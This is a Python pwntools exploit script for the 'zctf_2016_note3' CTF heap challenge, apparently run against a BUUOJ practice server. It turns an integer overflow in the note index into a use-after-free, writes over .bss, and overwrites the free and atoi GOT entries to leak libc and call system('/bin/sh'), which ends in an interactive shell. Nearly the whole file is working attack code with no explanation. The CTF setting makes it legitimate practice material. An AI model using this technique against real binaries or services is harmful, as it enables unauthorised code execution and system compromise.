from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./zctf_2016_note3"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 26244)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sla("option--->>\n", "1")
    sla(":(less than 1024)\n", str(size))
    sla("Input the note content:\n", con)

def edit(index, con):
    sla("option--->>\n", "3")
    sla("Input the id of the note:\n", str(index))
    sla("Input the new content:\n", con)

def free(index):
    sla("option--->>\n", "4")
    sla("Input the id of the note:\n", str(index))


## v1 = -v1 ==> int overflow ==> uaf

# uaf ==> alloc to bss
stderr = 0x06020B0
add(0x60, "0")
free(0x8000000000000000-0x10000000000000000)
edit(0, p64(stderr-0x3))

pro = ELF("./zctf_2016_note3")
puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
free_g = pro.got["free"]
atoi_g = pro.got["atoi"]

add(0x60, "1")
add(0x60, "2")
pad = cyclic(0x3+0x8)+p64(free_g)+p64(puts_g)+p64(atoi_g)
edit(2, pad)

# alter free_got to puts_plt
edit(0, p64(puts_p)[:7])
# leak
free(1)
info = u64(ru("\x7f").ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["puts"]
print("base: ", hex(base))
system = base+libc.sym["system"]

# alter atoi_got to system
edit(2, p64(system)[:7])

# attack
sla("option--->>\n", "/bin/sh\x00")

shell()


